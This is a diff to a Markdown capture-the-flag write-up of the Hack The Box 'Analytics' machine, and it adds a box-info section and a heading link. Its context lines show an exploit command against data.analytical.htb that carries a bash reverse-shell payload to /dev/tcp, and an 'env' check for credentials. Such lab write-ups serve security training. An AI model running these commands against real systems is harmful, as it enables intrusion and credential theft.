@@ -1,5 +1,9 @@
 # 💎 HTB: Analytics
 
+## 📌 Box Info
+- **OS**: [Linux](Linux)
+- **Difficulty**: [Easy](Easy)
+
 ## 🔍 Phase 1: Scanning & Enumeration
 
 ```bash
@@ -36,7 +40,7 @@ python3 main.py -u http://data.analytical.htb -t <token> -c "bash -i >& /dev/tcp
 
 > Gained reverse shell as `metabase`.
 
-### 🔑 Horizontal Privilege Escalation
+### 🔑 [Horizontal Privilege Escalation](SSH)
 
 ```bash
 env                                                    # Check for credentials in environment variables
